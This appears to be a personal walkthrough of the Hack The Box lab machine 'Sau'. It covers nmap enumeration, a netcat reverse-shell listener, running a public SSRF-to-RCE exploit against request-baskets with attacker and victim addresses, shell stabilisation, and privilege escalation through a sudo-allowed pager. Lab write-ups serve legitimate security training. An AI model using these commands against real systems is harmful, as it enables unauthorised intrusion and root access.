---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Sau?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![](../../0.%20Assets/Sau-1788988613561.webp)

---
# Walkthrough

# Foothold

Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap -sS -p 22,55555 $T --min-rate 5000 -sVC -Pn -oN results.txt -n -vv -Pn
```


We find `SSH` and an `HTTP` service running on an unusual port.

![](../../0.%20Assets/Sau-1788988918926.webp)

I looked up `request-baskets` online and found this.

![](../../0.%20Assets/Sau-1788988957529.webp)

Let's see if there's a public exploit before we get creative.

I found this [exploit](https://github.com/bl4ckarch/ssrf_to_rce_sau)

All we need to do is start a listener for the reverse shell.

```
rlwrap nc -lvnp 8000
```

And run the exploit.

```
python3 exploit_ssrf_to_rce_sau.py <ATTACKER_IP> <ATTACKER_PORT> <VICTIME's_BASKETS_URL>


python3 ssrf_to_rce_sau.py 10.10.15.150 8000 http://10.129.229.26:55555/
```

![](../../0.%20Assets/Sau-1788989150868.webp)

And we're in.

I stabilized the shell with:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

In the home directory we find the user flag.

![](../../0.%20Assets/Sau-1788989287952.webp)


# Privilege Escalation

For privilege escalation I like to run a few quick checks before reaching for `LSE` or `Linpeas`.

In this case I checked the `sudo` permissions.

![](../../0.%20Assets/Sau-1788989535915.webp)

It looks like we can use `sudo` to check the status of the service.

![](../../0.%20Assets/Sau-1788989666773.webp)

This opens in a pager.

https://gtfobins.org/gtfobins/less/

![](../../0.%20Assets/Sau-1788992444768.webp)

Let's see if it works.

![](../../0.%20Assets/Sau-1788992486569.webp)

